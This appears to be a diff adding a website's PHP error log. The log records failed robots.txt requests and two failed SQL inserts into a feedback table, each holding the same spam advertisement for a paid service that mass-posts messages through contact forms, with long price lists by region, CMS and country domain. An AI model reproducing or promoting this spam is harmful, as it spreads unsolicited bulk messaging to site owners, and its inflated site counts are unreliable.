@@ -1,0 +1,754 @@
+[ 2021-10-03T01:13:02+08:00 ] 203.208.60.4 /robots.txt
+ERR: 无法加载控制器:Robots
+
+[ 2021-10-03T05:43:52+08:00 ] 54.36.148.142 /robots.txt
+ERR: 无法加载控制器:Robots
+
+[ 2021-10-03T05:48:26+08:00 ] 91.76.244.22 /index.php/Feedback/add
+ERR: 1406:Data too long for column 'content' at row 1
+ [ SQL语句 ] : INSERT INTO `hbv5_feedback` (`content`,`username`,`mobile`,`cate_name`,`add_time`) VALUES ('I\'m happy to welcome you! 
+ 
+We offer a service of sending newsletters via contact forms to the sites of companies via all countries and domain zones of the world in all languages.  
+ 
+The Letter is sent to email address of institution one hundred percent will get to inbox folder! 
+ 
+2000 bases: 
+Price List =» xn----7sbb1bbndheurc1a.xn--p1ai/prajs-list/ 
+ 
+Test mailing: $20 – 20000 contact forms websites 
+ 
+All Europe 44 countries there are 60726150 websites – $1100 
+ 
+All EU 28 countries there are 56752547 websites – $1000 
+ 
+All Asia 48 countries there are 14662004 websites – $500 
+ 
+All Africa 50 countries there are 1594390 websites – $200 
+ 
+All North and Central America is 35 countries there are 7441637 websites – $300 
+ 
+All South America 14 countries there are 5826884 websites – $200 
+ 
+Top 1 Million World’s Best websites – $100 
+ 
+Top 16821856 the most visited websites in the world – $300 
+ 
+New websites from around the world registered 24-48 hours ago. (A cycle of 15 mailings during the month) – 500$ 
+ 
+Businesses and organizations of the Russian Federation – there are 4025015 websites – $300 
+ 
+All Russian-speaking countries minus Russia – there are 14 countries and 2637726 websites – $200 
+ 
+New websites of the Russian Federation, registered 24-48 hours ago. (A cycle of 15 mailings during the month) – 250$ 
+ 
+1499203 of hosting websites around the world (there are selections for all countries, are excluded from databases for mailings) – $150 
+ 
+295285 websites of public authorities of all countries of the world (selections for all countries, are excluded from databases for mailings) – $100 
+ 
+3516251 websites online stores Worldwide – $250 
+ 
+By language: 
+ 
+Websites in English - 54797239 websites - $1200 
+That speak French language - 18655242 websites - $600 
+Websites in Spanish - 9013026 websites - $400 
+That speak German - 22397305 websites - $800 
+Portuguese-speaking websites - 6862084 websites - $300 
+Websites in Russian - 6662741 websites - $300 
+ 
+CMS mailings: 
+ 
+Amiro	        1794     websites - $50 
+Bitrix	        278751   websites - $80 
+BigCommerce     78257    websites - $50 
+Concrete5	39121    websites - $50 
+CONTENIDO	5069     websites - $50 
+CubeCart	1062     websites - $50 
+CMSimple        11052    websites - $50 
+CS Cart         1180     websites - $50 
+Datalife Engine	29438    websites - $50 
+Discuz	        47962    websites - $50 
+Dotnetnuke	82964    websites - $50 
+Drupal	        978298   websites - $100 
+Flexbe	        15072    websites - $50 
+HostCMS	        5042     websites - $50 
+InstantCMS	4136     websites - $50 
+InSales	        11081    websites - $50 
+Invision Power Board 2430websites - $30 
+Joomla	        1906994  websites - $150 
+Liferay	        5137     websites - $50 
+Magento	        369447   websites - $80 
+MODx	        64023    websites - $50 
+Movable Type	9171     websites - $50 
+NetCat	        6636     websites - $50 
+NopCommerce	3892     websites - $50 
+OpenCart	415575   websites - $80 
+osCommerce	68468    websites - $50 
+OpenCms         5916     websites - $50 
+phpBB	        20045    websites - $50 
+Prestashop	328287   websites - $80 
+Shopify	        2343709  websites - $200 
+Simpla	        17429    websites - $50 
+Sitefinity	4183     websites - $50 
+Textpattern	882      websites - $30 
+Tilda	        47396    websites - $50 
+TYPO3	        845009   websites - $80 
+UMI.CMS	        13191    websites - $50 
+vBulletin	14460    websites - $50 
+Volusion        16006    websites - $50 
+Wix	        3379081  websites - $250 
+Wordpress       35354537 websites - $650 
+WooCommerce     4459525  websites - $300 
+XenForo         21105    websites - $50 
+Zen Cart        26524    websites - $50 
+ 
+ 
+ 
+.ae 233019 websites UAE - $50 
+.ae 10938 websites International zone UAE:.com .net .biz .info .name .tel .mobi .asia-$50 
+.ag 11931 websites Antigua and Barbuda - $50 
+.ai 33130 websites Anguilla - $50 
+.am 46971 websites Armenia - $50 
+.am 1684 websites International zone Armenia:.com .net .biz .info .name .tel 
+.ar 782608 websites Argentina - $80 
+.ar 75496 websites International zone Argentina:.com .net .biz .info .name .tel .mobi .asia-$50 
+.ar.com 135 websites - $30 
+.at 1356722 websites Austria - $100 
+.at 181907 websites International zone Austria :.com .net .biz .info .name 
+.au 2432174 websites Australia - $150 
+.au 461279 websites International zone Australia:.com .net .biz .info .name 
+.az 28177 websites Azerbaijan - $50 
+.az 2036 websites International zone Azerbaijan:.com .net .biz .info .name .tel .mobi .asia-$30 
+.ba 15725 websites Bosnia and Herzegovina - $30 
+.ba 2291 websites international zone Bosnia and Herzegovina:.com.net.biz.info.org.name.tel.mobi.asia-$30 
+.be 1349658 websites Belgium - $100 
+.be 1056248 websites International zone Belgium:.com .net .biz .info .name 
+.bg 54418 websites Bulgaria - $50 
+.bg 50685 websites International zone Bulgaria:.com .net .biz .info .name 
+.bo 2602 websites Bolivia - $30 
+.bo 29415 websites International zone Bolivia:.com .net .biz .info .name .tel .mobi .asia-$50 
+.br 3205100 websites Brazil - $200 
+.br 1230078 websites International zone Brazil:.com .net .biz .info .name . 
+.by 183813 websites Belarus - $50 
+.by 1574 websites International zone Belarus:.com .net .biz .info .name .tel 
+.ca 2587463 websites Canada - $150 
+.ca 288395 websites International zone Canada:.com .net .biz .info .name 
+.cc 436396 websites - $80 
+.cc 1920589 websites Cocos Keeling Islands- $100 
+.cf 2461460 websites Central African Republic - $150 
+.cg 526 websites Congo - $30 
+.ch 1629450 websites Switzerland - $100 
+.ch 205292 websites International zone Switzerland:.com .net .biz .info .name .tel .mobi .asia-$50 
+.ci 5794 websites Cote d\'Ivoire - $30 
+.ci 112 websites International zone Cote d\'Ivoire:.com .net .biz .info .name 
+.cl 590401 websites Chile - $80 
+.cl 65996 websites International zone Chile:.com .net .biz .info .name .tel .mobi .asia-$50 
+.cm 29221 websites Cameroon- $50 
+.cn 23160610 websites China - $600 
+.cn 1372416 websites International zone China:.com .net .biz .info .name .tel .mobi .asia-$100 
+.co 1878923 websites Colombia - $100 
+.co 10854 websites International zone Colombia:.com .net .biz .info .name .tel .mobi .asia-$30 
+.cx 15753 websites Christmas Island - $50 
+.cy 11092 websites Cyprus - $50 
+.cy 744 websites International zone Cyprus:.com .net .biz .info .name .tel .mobi .asia-$30 
+.cz 1001208 websites Czech Republic - $100 
+.cz 193400 websites International zone Czech Republic:.com .net .biz .info .name .tel .mobi .asia-$50 
+.de 15078512 websites Germany - $350 
+.de 3894156 websites International zone Germany:.com .net .biz .info .name .tel .mobi .asia-$150 
+.dk 1732020 websites Denmark - $150 
+.dk 148164 websites International zone Denmark:.com .net .biz .info .name .tel .mobi .asia-$50 
+.dm 23318 websites Dominica - $50 
+.dn.ua 1835 websites - $30 
+.do 5255 websites Dominican Republic- $30 
+.dy.fi 1112 websites - $30 
+.dz 5382 websites Algeria - $30 
+.ec 11731 websites Ecuador - $50 
+.ec 2897 websites International zone Ecuador:.com .net .biz .info .name .tel .mobi .asia-$30 
+.ee 172423 websites Estonia- $50 
+.ee 10490 websites International zone Estonia:.com .net .biz .info .name .tel .mobi .asia-$30 
+.es 1509048 websites Spain - $100 
+.es 683845 websites International zone Spain:.com .net .biz .info .name .tel .eu 3046076 websites Europe - $150 
+.eu 633384 websites International zone Europe:.com .net .biz .info .name .fi 361111 websites Finland - $80 
+.fi 69631 websites International zone Finland:.com .net .biz .info .name .fr 2810983 websites France - $150 
+.fr 639546 websites International zone France:.com .net .biz .info .name .ge .ge 38616 websites Georgia - $50 
+.ge 1676 websites International zone Georgia:.com .net .biz .info .name .tel .gf 996 websites French Guiana - $30 
+.gg 10528 websites Guernsey islands - $50 
+.gh 703 websites Ghana - $30 
+.gi 981 websites Gibraltar - $30 
+.gp 2044 websites Guadeloupe - $30 
+.gq 2027422 websites Equatorial Guinea - $100 
+.gr 327215 websites Greece - $80 
+.gr 57984 websites International zone Greece:.com .net .biz .info .name .tel .mobi .asia-$150 
+.gt 15351 websites Guatemala - $50 
+.hk 116093 websites Hong Kong - $50 
+.hm 335 websites Heard &amp; McDonald islands - $30 
+.hn 4732 websites Honduras - $30 
+.hr 75736 websites Croatia - $50 
+.hr 16592 websites International zone Croatia:.com .net .biz .info .name .tel .mobi .asia 
+.ht 1299 websites Haiti - $30 
+.hu 53940 websites International zone Hungary:.com .net .biz .info .name .tel .mobi .asia-$50 
+.ie 209620 websites Ireland - $50 
+.ie 49861 websites International zone Ireland:.com .net .biz .info .name .il 196266 websites Israel - $80 
+.il 38537 websites International zone Israel:.com .net .biz .info .name .tel .in 1157482 websites India - $100 
+.in 266179 websites International zone India:.com .net .biz .info .name .tel .io 496216 websites British Indian Ocean - $80 
+.iq 2401 websites Iraq - $30 
+.ir 574258 websites Iran - $80 
+.ir 15487 websites International zone Iran:.com .net .biz .info .name .tel .mobi .asia 
+.it 2410105 websites Italy – $150 
+.it 954040 websites International zone Italy:.com.net.biz.info.org.name.tel.mobi.asia-$100 
+.je 3016 websites Ireland - $30 
+.jp 1825219 websites Japan - $150 
+.jp 4683252 websites International zone Japan:.com.net.biz.info.org.name.tel.mobi.asia-$200 
+.jp.net 5170 websites - $30 
+.ke 14677 websites Kenya - $50 
+.kg 16706 websites Kyrgyzstan - $50 
+.kg 664 websites International zone Kyrgyzstan:.com .net .biz .info .name .tel .mobi .asia-$30 
+.ki 79 websites Kiribati - $30 
+.kn 3211 websites Saint Kitts and Nevis - $30 
+.kr 272463 websites Korea- $80 
+.kw 484 websites Kuwait - $30 
+.ky 5783 websites Cayman Islands - $30 
+.kz 196249 websites Kazakhstan - $80 
+.kz 5876 websites International zone Kazakhstan:.com .net .biz .info .name .tel .mobi .asia-$30 
+.lc 1121 websites Saint Lucia - $30 
+.lk 32654 websites Sri Lanka - $30 
+.lt 138973 websites Lithuania- $50 
+.lt 27710 websites International zone Lithuania:.com .net .biz .info .name .tel .mobi .asia- $50 
+.lu 74322 websites Luxembourg - $50 
+.lu 4125 websites International zone Luxembourg:.com .net .biz .info .name .tel .mobi .asia-$30 
+.lv 202814 websites Latvia - $50 
+.lv 8887 websites International zone Latvia:.com .net .biz .info .name .tel .mobi .asia-$30 
+.ma 59103 websites Morocco - $50 
+.mc 3046 websites Monaco - $30 
+.md 31945 websites Moldova - $50 
+.md 1293 websites International zone Moldova:.com .net .biz .info .name .tel .mobi .asia-$30 
+.me 761596 websites Montenegro - $80 
+.me 86897 websites International zone Montenegro:.com .net .biz .info .name .tel .mobi .asia-$50 
+.mg 3715 websites Madagascar- $30 
+.mk 13266 websites Macedonia - $50 
+.ml 2158835 websites Mali - $100 
+.mn 17044 websites Mongolia - $50 
+.mq 1112 websites Martinique (French) - $30 
+.mr 776 websites Mauritania - $30 
+.ms 7265 websites Montserrat - $30 
+.mt 1402 websites Malta - $30 
+.mu 6475 websites Maurifius - $30 
+.mv 1996 websites Maldives - $30 
+.mw 8579 websites Malawi - $30 
+.mx 670901 websites Mexico- $80 
+.mx 174571 websites International zone Mexico:.com .net .biz .info .name .tel .mobi .asia-$50 
+.my 197328 websites Malaysia- $50 
+.my 14294 websites International zone Malaysia:.com .net .biz .info .name .tel .mobi .asia-$50 
+.na 1094 websites - $30 
+.nc 3497 websites New Coledonia (French) - $30 
+.nl 3925784 websites Netherlands - $200 
+.nl 1019697 websites International zone Netherlands:.com .net .biz .info .name .tel .mobi .asia-$100 
+.no 620882 websites Norway - $80 
+.no 74318 websites International zone Norway:.com .net .biz .info .name .tel .mobi .asia-$50 
+.nu 255161 websites Niue- $50 
+.nz 593127 websites New Zealand - $80 
+.om 1701 websites Oman - $30 
+.pe 83224 websites Peru - $50 
+.pe 59157 websites International zone Peru:.com .net .biz .info .name .tel .mobi .asia-$50 
+.pk 44464 websites Pakistan - $50 
+.pl 1795299 websites Poland - $100 
+.pl 327587 websites International zone Poland:.com .net .biz .info .name .tel .mobi .asia-$50 
+.pr 1358 websites Puerto Rico - $30 
+.pt 263136 websites Portugal - $80 
+.pt 17691 websites International zone Portugal:.com .net .biz .info .name .tel .mobi .asia-$50 
+.py 5593 websites Paraguay - $30 
+.py 653 websites International zone Paraguay:.com .net .biz .info .name .tel .mobi .asia-$30 
+.re 15089 websites Reunion (French) - $50 
+.ro 665267 websites Romania - $80 
+.ro 89068 websites International zone Romania:.com .net .biz .info .name .tel .mobi .asia-$50 
+.rs 85503 websites Serbia - $50 
+.ru 5025331 websites Russian - $250 
+.ru 514668 websites International zone Russian:.com .net .biz .info .name .tel .mobi .asia-$80 
+.rw 3806 websites Rwanda - $30 
+.sa 45210 websites Saudi Arabia- $50 
+.sa 8164 websites International zone Saudi Arabia:.com .net .biz .info .name .tel .mobi .asia - $30 
+.sc 4442 websites Seychelles- $30 
+.se 1491677 websites Sweden - $100 
+.se 293316 websites International zone Sweden:.com .net .biz .info .name .tel .mobi .asia-$50 
+.sg 150351 websites Republic Of Singapore - $50 
+.sh 7560 websites Saint Helena - $30 
+.si 103778 websites Slovenia- $50 
+.si 12879 websites International zone Slovenia:.com .net .biz .info .name .tel .mobi .asia-$50 
+.sk 414198 websites Slovakia- $80 
+.sk 31572 websites International zone Slovakia:.com .net .biz .info .name .tel .mobi .asia-$50 
+.sm 8897 websites San Marino - $30 
+.sn 344 websites International zone Senegal:.com .net .biz .info .name .tel .mobi .asia-$30 
+.sn 4465 websites Senegal - $30 
+.sr 580 websites Suriname - $30 
+.sv 8432 websites Salvador- $30 
+.sx 2901 websites Sint Maarten - $30 
+.sy 2972 websites Syria - $30 
+.sz 321 websites Swaziland - $30 
+.tc 16384 websites Turks and Caicos Islands- $50 
+.tf 19841 websites French Sauthern Territory - $50 
+.tg 1230 websites Togo - $30 
+.th 22368 websites Kingdom Of Thailand- $50 
+.tj 9492 websites Tajikistan- $50 
+.tj 34 websites International zone Tajikistan:.com .net .biz .info .name .tel .mobi .asia 
+.tk 20085806 websites Tokelau - $500 
+.tl 2748 websites East Timor - $30 
+.tm 7203 websites Turkmenistan- $50 
+.tm 44 websites International zone Turkmenistan:.com .net .biz .info .name .tel .mobi .asia 
+.tr 243347 websites Turkey - $80 
+.tr 138818 International zone Turkey:.com .net .biz .info .name .tel .mobi .asia -$50 
+.tt 1017 websites Trinidad &amp; Tobago  - $30 
+.ua 1274459 websites Ukraina - $100 
+.ua 147202 websites International zone Ukraine:.com .net .biz .info .name .tel .mobi .asia-$50 
+.ug 3806 websites Uganda - $30 
+.ug 720 websites International zone Uganda:.com .net .biz .info .name .tel .mobi.asia-$30 
+.uk 5975887 websites United Kingdom - $250 
+.uk 3304606 websites International zone United Kingdom:.com .net .biz .info .name .tel .mobi .asia-$150 
+.us 4828526 websites USA - $300 
+.us 1211424 websites International zone USA:.com .net .biz .info .name .tel .mobi .asia - $100 
+.uy 15571 websites Uruguay - $50 
+.uy 31812 websites International zone Uruguay:.com .net .biz .info .name .tel .mobi .asia-$30 
+.uz 65125 websites Uzbekistan - $50 
+.uz  365 websites International zone Uzbekistan:.com .net .biz .info .name .tel .mobi .asia 
+.vc 18641 websites Saint Vincent &amp; Grenadines - $50 
+.ve 14015 websites Venezuela - $50 
+.ve 2898 websites International zone Venezuela:.com .net .biz .info .name .tel .mobi .asia - $30 
+.vg 8389 websites Virgin Islands (British) - $50 
+.vi 109 websites Virgin Islands (US) - $30 
+.vn 436005 websites Vietnam - $80 
+.vn 161855 websites International zone Vietnam:.com .net .biz .info .name .tel .mobi .asia - $50 
+.vu 1051 websites Vanuatu - $30 
+.wf 1133 websites Wallis &amp; Futuna Islands - $30 
+.ws 99308 websites Samoa - $80 
+.ye 18 websites Yemen - $30 
+.yt 2004 websites Mayotte - $30 
+.za 1008308 websites South Africa - $100 
+ 
+website =» xn----7sbb1bbndheurc1a.xn--p1ai','contactimcoen','123456789','??','1633211306')
+ERR: 1406:Data too long for column 'content' at row 1
+ [ SQL语句 ] : INSERT INTO `hbv5_feedback` (`content`,`username`,`mobile`,`cate_name`,`add_time`) VALUES ('I\'m happy to welcome you! 
+ 
+We offer a service of sending newsletters via contact forms to the sites of companies via all countries and domain zones of the world in all languages.  
+ 
+The Letter is sent to email address of institution one hundred percent will get to inbox folder! 
+ 
+2000 bases: 
+Price List =» xn----7sbb1bbndheurc1a.xn--p1ai/prajs-list/ 
+ 
+Test mailing: $20 – 20000 contact forms websites 
+ 
+All Europe 44 countries there are 60726150 websites – $1100 
+ 
+All EU 28 countries there are 56752547 websites – $1000 
+ 
+All Asia 48 countries there are 14662004 websites – $500 
+ 
+All Africa 50 countries there are 1594390 websites – $200 
+ 
+All North and Central America is 35 countries there are 7441637 websites – $300 
+ 
+All South America 14 countries there are 5826884 websites – $200 
+ 
+Top 1 Million World’s Best websites – $100 
+ 
+Top 16821856 the most visited websites in the world – $300 
+ 
+New websites from around the world registered 24-48 hours ago. (A cycle of 15 mailings during the month) – 500$ 
+ 
+Businesses and organizations of the Russian Federation – there are 4025015 websites – $300 
+ 
+All Russian-speaking countries minus Russia – there are 14 countries and 2637726 websites – $200 
+ 
+New websites of the Russian Federation, registered 24-48 hours ago. (A cycle of 15 mailings during the month) – 250$ 
+ 
+1499203 of hosting websites around the world (there are selections for all countries, are excluded from databases for mailings) – $150 
+ 
+295285 websites of public authorities of all countries of the world (selections for all countries, are excluded from databases for mailings) – $100 
+ 
+3516251 websites online stores Worldwide – $250 
+ 
+By language: 
+ 
+Websites in English - 54797239 websites - $1200 
+That speak French language - 18655242 websites - $600 
+Websites in Spanish - 9013026 websites - $400 
+That speak German - 22397305 websites - $800 
+Portuguese-speaking websites - 6862084 websites - $300 
+Websites in Russian - 6662741 websites - $300 
+ 
+CMS mailings: 
+ 
+Amiro	        1794     websites - $50 
+Bitrix	        278751   websites - $80 
+BigCommerce     78257    websites - $50 
+Concrete5	39121    websites - $50 
+CONTENIDO	5069     websites - $50 
+CubeCart	1062     websites - $50 
+CMSimple        11052    websites - $50 
+CS Cart         1180     websites - $50 
+Datalife Engine	29438    websites - $50 
+Discuz	        47962    websites - $50 
+Dotnetnuke	82964    websites - $50 
+Drupal	        978298   websites - $100 
+Flexbe	        15072    websites - $50 
+HostCMS	        5042     websites - $50 
+InstantCMS	4136     websites - $50 
+InSales	        11081    websites - $50 
+Invision Power Board 2430websites - $30 
+Joomla	        1906994  websites - $150 
+Liferay	        5137     websites - $50 
+Magento	        369447   websites - $80 
+MODx	        64023    websites - $50 
+Movable Type	9171     websites - $50 
+NetCat	        6636     websites - $50 
+NopCommerce	3892     websites - $50 
+OpenCart	415575   websites - $80 
+osCommerce	68468    websites - $50 
+OpenCms         5916     websites - $50 
+phpBB	        20045    websites - $50 
+Prestashop	328287   websites - $80 
+Shopify	        2343709  websites - $200 
+Simpla	        17429    websites - $50 
+Sitefinity	4183     websites - $50 
+Textpattern	882      websites - $30 
+Tilda	        47396    websites - $50 
+TYPO3	        845009   websites - $80 
+UMI.CMS	        13191    websites - $50 
+vBulletin	14460    websites - $50 
+Volusion        16006    websites - $50 
+Wix	        3379081  websites - $250 
+Wordpress       35354537 websites - $650 
+WooCommerce     4459525  websites - $300 
+XenForo         21105    websites - $50 
+Zen Cart        26524    websites - $50 
+ 
+ 
+ 
+.ae 233019 websites UAE - $50 
+.ae 10938 websites International zone UAE:.com .net .biz .info .name .tel .mobi .asia-$50 
+.ag 11931 websites Antigua and Barbuda - $50 
+.ai 33130 websites Anguilla - $50 
+.am 46971 websites Armenia - $50 
+.am 1684 websites International zone Armenia:.com .net .biz .info .name .tel 
+.ar 782608 websites Argentina - $80 
+.ar 75496 websites International zone Argentina:.com .net .biz .info .name .tel .mobi .asia-$50 
+.ar.com 135 websites - $30 
+.at 1356722 websites Austria - $100 
+.at 181907 websites International zone Austria :.com .net .biz .info .name 
+.au 2432174 websites Australia - $150 
+.au 461279 websites International zone Australia:.com .net .biz .info .name 
+.az 28177 websites Azerbaijan - $50 
+.az 2036 websites International zone Azerbaijan:.com .net .biz .info .name .tel .mobi .asia-$30 
+.ba 15725 websites Bosnia and Herzegovina - $30 
+.ba 2291 websites international zone Bosnia and Herzegovina:.com.net.biz.info.org.name.tel.mobi.asia-$30 
+.be 1349658 websites Belgium - $100 
+.be 1056248 websites International zone Belgium:.com .net .biz .info .name 
+.bg 54418 websites Bulgaria - $50 
+.bg 50685 websites International zone Bulgaria:.com .net .biz .info .name 
+.bo 2602 websites Bolivia - $30 
+.bo 29415 websites International zone Bolivia:.com .net .biz .info .name .tel .mobi .asia-$50 
+.br 3205100 websites Brazil - $200 
+.br 1230078 websites International zone Brazil:.com .net .biz .info .name . 
+.by 183813 websites Belarus - $50 
+.by 1574 websites International zone Belarus:.com .net .biz .info .name .tel 
+.ca 2587463 websites Canada - $150 
+.ca 288395 websites International zone Canada:.com .net .biz .info .name 
+.cc 436396 websites - $80 
+.cc 1920589 websites Cocos Keeling Islands- $100 
+.cf 2461460 websites Central African Republic - $150 
+.cg 526 websites Congo - $30 
+.ch 1629450 websites Switzerland - $100 
+.ch 205292 websites International zone Switzerland:.com .net .biz .info .name .tel .mobi .asia-$50 
+.ci 5794 websites Cote d\'Ivoire - $30 
+.ci 112 websites International zone Cote d\'Ivoire:.com .net .biz .info .name 
+.cl 590401 websites Chile - $80 
+.cl 65996 websites International zone Chile:.com .net .biz .info .name .tel .mobi .asia-$50 
+.cm 29221 websites Cameroon- $50 
+.cn 23160610 websites China - $600 
+.cn 1372416 websites International zone China:.com .net .biz .info .name .tel .mobi .asia-$100 
+.co 1878923 websites Colombia - $100 
+.co 10854 websites International zone Colombia:.com .net .biz .info .name .tel .mobi .asia-$30 
+.cx 15753 websites Christmas Island - $50 
+.cy 11092 websites Cyprus - $50 
+.cy 744 websites International zone Cyprus:.com .net .biz .info .name .tel .mobi .asia-$30 
+.cz 1001208 websites Czech Republic - $100 
+.cz 193400 websites International zone Czech Republic:.com .net .biz .info .name .tel .mobi .asia-$50 
+.de 15078512 websites Germany - $350 
+.de 3894156 websites International zone Germany:.com .net .biz .info .name .tel .mobi .asia-$150 
+.dk 1732020 websites Denmark - $150 
+.dk 148164 websites International zone Denmark:.com .net .biz .info .name .tel .mobi .asia-$50 
+.dm 23318 websites Dominica - $50 
+.dn.ua 1835 websites - $30 
+.do 5255 websites Dominican Republic- $30 
+.dy.fi 1112 websites - $30 
+.dz 5382 websites Algeria - $30 
+.ec 11731 websites Ecuador - $50 
+.ec 2897 websites International zone Ecuador:.com .net .biz .info .name .tel .mobi .asia-$30 
+.ee 172423 websites Estonia- $50 
+.ee 10490 websites International zone Estonia:.com .net .biz .info .name .tel .mobi .asia-$30 
+.es 1509048 websites Spain - $100 
+.es 683845 websites International zone Spain:.com .net .biz .info .name .tel .eu 3046076 websites Europe - $150 
+.eu 633384 websites International zone Europe:.com .net .biz .info .name .fi 361111 websites Finland - $80 
+.fi 69631 websites International zone Finland:.com .net .biz .info .name .fr 2810983 websites France - $150 
+.fr 639546 websites International zone France:.com .net .biz .info .name .ge .ge 38616 websites Georgia - $50 
+.ge 1676 websites International zone Georgia:.com .net .biz .info .name .tel .gf 996 websites French Guiana - $30 
+.gg 10528 websites Guernsey islands - $50 
+.gh 703 websites Ghana - $30 
+.gi 981 websites Gibraltar - $30 
+.gp 2044 websites Guadeloupe - $30 
+.gq 2027422 websites Equatorial Guinea - $100 
+.gr 327215 websites Greece - $80 
+.gr 57984 websites International zone Greece:.com .net .biz .info .name .tel .mobi .asia-$150 
+.gt 15351 websites Guatemala - $50 
+.hk 116093 websites Hong Kong - $50 
+.hm 335 websites Heard &amp; McDonald islands - $30 
+.hn 4732 websites Honduras - $30 
+.hr 75736 websites Croatia - $50 
+.hr 16592 websites International zone Croatia:.com .net .biz .info .name .tel .mobi .asia 
+.ht 1299 websites Haiti - $30 
+.hu 53940 websites International zone Hungary:.com .net .biz .info .name .tel .mobi .asia-$50 
+.ie 209620 websites Ireland - $50 
+.ie 49861 websites International zone Ireland:.com .net .biz .info .name .il 196266 websites Israel - $80 
+.il 38537 websites International zone Israel:.com .net .biz .info .name .tel .in 1157482 websites India - $100 
+.in 266179 websites International zone India:.com .net .biz .info .name .tel .io 496216 websites British Indian Ocean - $80 
+.iq 2401 websites Iraq - $30 
+.ir 574258 websites Iran - $80 
+.ir 15487 websites International zone Iran:.com .net .biz .info .name .tel .mobi .asia 
+.it 2410105 websites Italy – $150 
+.it 954040 websites International zone Italy:.com.net.biz.info.org.name.tel.mobi.asia-$100 
+.je 3016 websites Ireland - $30 
+.jp 1825219 websites Japan - $150 
+.jp 4683252 websites International zone Japan:.com.net.biz.info.org.name.tel.mobi.asia-$200 
+.jp.net 5170 websites - $30 
+.ke 14677 websites Kenya - $50 
+.kg 16706 websites Kyrgyzstan - $50 
+.kg 664 websites International zone Kyrgyzstan:.com .net .biz .info .name .tel .mobi .asia-$30 
+.ki 79 websites Kiribati - $30 
+.kn 3211 websites Saint Kitts and Nevis - $30 
+.kr 272463 websites Korea- $80 
+.kw 484 websites Kuwait - $30 
+.ky 5783 websites Cayman Islands - $30 
+.kz 196249 websites Kazakhstan - $80 
+.kz 5876 websites International zone Kazakhstan:.com .net .biz .info .name .tel .mobi .asia-$30 
+.lc 1121 websites Saint Lucia - $30 
+.lk 32654 websites Sri Lanka - $30 
+.lt 138973 websites Lithuania- $50 
+.lt 27710 websites International zone Lithuania:.com .net .biz .info .name .tel .mobi .asia- $50 
+.lu 74322 websites Luxembourg - $50 
+.lu 4125 websites International zone Luxembourg:.com .net .biz .info .name .tel .mobi .asia-$30 
+.lv 202814 websites Latvia - $50 
+.lv 8887 websites International zone Latvia:.com .net .biz .info .name .tel .mobi .asia-$30 
+.ma 59103 websites Morocco - $50 
+.mc 3046 websites Monaco - $30 
+.md 31945 websites Moldova - $50 
+.md 1293 websites International zone Moldova:.com .net .biz .info .name .tel .mobi .asia-$30 
+.me 761596 websites Montenegro - $80 
+.me 86897 websites International zone Montenegro:.com .net .biz .info .name .tel .mobi .asia-$50 
+.mg 3715 websites Madagascar- $30 
+.mk 13266 websites Macedonia - $50 
+.ml 2158835 websites Mali - $100 
+.mn 17044 websites Mongolia - $50 
+.mq 1112 websites Martinique (French) - $30 
+.mr 776 websites Mauritania - $30 
+.ms 7265 websites Montserrat - $30 
+.mt 1402 websites Malta - $30 
+.mu 6475 websites Maurifius - $30 
+.mv 1996 websites Maldives - $30 
+.mw 8579 websites Malawi - $30 
+.mx 670901 websites Mexico- $80 
+.mx 174571 websites International zone Mexico:.com .net .biz .info .name .tel .mobi .asia-$50 
+.my 197328 websites Malaysia- $50 
+.my 14294 websites International zone Malaysia:.com .net .biz .info .name .tel .mobi .asia-$50 
+.na 1094 websites - $30 
+.nc 3497 websites New Coledonia (French) - $30 
+.nl 3925784 websites Netherlands - $200 
+.nl 1019697 websites International zone Netherlands:.com .net .biz .info .name .tel .mobi .asia-$100 
+.no 620882 websites Norway - $80 
+.no 74318 websites International zone Norway:.com .net .biz .info .name .tel .mobi .asia-$50 
+.nu 255161 websites Niue- $50 
+.nz 593127 websites New Zealand - $80 
+.om 1701 websites Oman - $30 
+.pe 83224 websites Peru - $50 
+.pe 59157 websites International zone Peru:.com .net .biz .info .name .tel .mobi .asia-$50 
+.pk 44464 websites Pakistan - $50 
+.pl 1795299 websites Poland - $100 
+.pl 327587 websites International zone Poland:.com .net .biz .info .name .tel .mobi .asia-$50 
+.pr 1358 websites Puerto Rico - $30 
+.pt 263136 websites Portugal - $80 
+.pt 17691 websites International zone Portugal:.com .net .biz .info .name .tel .mobi .asia-$50 
+.py 5593 websites Paraguay - $30 
+.py 653 websites International zone Paraguay:.com .net .biz .info .name .tel .mobi .asia-$30 
+.re 15089 websites Reunion (French) - $50 
+.ro 665267 websites Romania - $80 
+.ro 89068 websites International zone Romania:.com .net .biz .info .name .tel .mobi .asia-$50 
+.rs 85503 websites Serbia - $50 
+.ru 5025331 websites Russian - $250 
+.ru 514668 websites International zone Russian:.com .net .biz .info .name .tel .mobi .asia-$80 
+.rw 3806 websites Rwanda - $30 
+.sa 45210 websites Saudi Arabia- $50 
+.sa 8164 websites International zone Saudi Arabia:.com .net .biz .info .name .tel .mobi .asia - $30 
+.sc 4442 websites Seychelles- $30 
+.se 1491677 websites Sweden - $100 
+.se 293316 websites International zone Sweden:.com .net .biz .info .name .tel .mobi .asia-$50 
+.sg 150351 websites Republic Of Singapore - $50 
+.sh 7560 websites Saint Helena - $30 
+.si 103778 websites Slovenia- $50 
+.si 12879 websites International zone Slovenia:.com .net .biz .info .name .tel .mobi .asia-$50 
+.sk 414198 websites Slovakia- $80 
+.sk 31572 websites International zone Slovakia:.com .net .biz .info .name .tel .mobi .asia-$50 
+.sm 8897 websites San Marino - $30 
+.sn 344 websites International zone Senegal:.com .net .biz .info .name .tel .mobi .asia-$30 
+.sn 4465 websites Senegal - $30 
+.sr 580 websites Suriname - $30 
+.sv 8432 websites Salvador- $30 
+.sx 2901 websites Sint Maarten - $30 
+.sy 2972 websites Syria - $30 
+.sz 321 websites Swaziland - $30 
+.tc 16384 websites Turks and Caicos Islands- $50 
+.tf 19841 websites French Sauthern Territory - $50 
+.tg 1230 websites Togo - $30 
+.th 22368 websites Kingdom Of Thailand- $50 
+.tj 9492 websites Tajikistan- $50 
+.tj 34 websites International zone Tajikistan:.com .net .biz .info .name .tel .mobi .asia 
+.tk 20085806 websites Tokelau - $500 
+.tl 2748 websites East Timor - $30 
+.tm 7203 websites Turkmenistan- $50 
+.tm 44 websites International zone Turkmenistan:.com .net .biz .info .name .tel .mobi .asia 
+.tr 243347 websites Turkey - $80 
+.tr 138818 International zone Turkey:.com .net .biz .info .name .tel .mobi .asia -$50 
+.tt 1017 websites Trinidad &amp; Tobago  - $30 
+.ua 1274459 websites Ukraina - $100 
+.ua 147202 websites International zone Ukraine:.com .net .biz .info .name .tel .mobi .asia-$50 
